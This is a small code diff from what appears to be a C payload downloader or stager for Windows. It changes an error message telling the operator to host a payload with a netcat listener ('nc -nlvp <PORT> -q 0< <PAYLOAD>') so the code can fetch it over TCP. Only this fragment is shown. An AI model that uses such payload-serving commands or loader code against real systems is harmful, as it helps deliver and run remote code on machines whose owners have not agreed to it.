@@ -111,7 +111,7 @@ BOOL DownloadUsingTCPSocket(const PDOWNLOAD_CONTEXT pDc) {
      
     if (connect(clientSocket, (struct sockaddr*) &serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
         TranslateErrorPrint(WSAGetLastError());
-        snprintf(errMsg, sizeof(errMsg), "Connection failed to %s:%d.\n[!] Make sure to host your payload with the following command\n\t$ nc -nlvp <PORT> -q 1< <PAYLOAD>\n", pDc->ip, pDc->port);
+        snprintf(errMsg, sizeof(errMsg), "Connection failed to %s:%d.\n[!] Make sure to host your payload with the following command\n\t$ nc -nlvp <PORT> -q 0< <PAYLOAD>\n", pDc->ip, pDc->port);
         TranslateErrorPrintStr(errMsg);
         return FALSE;
     }
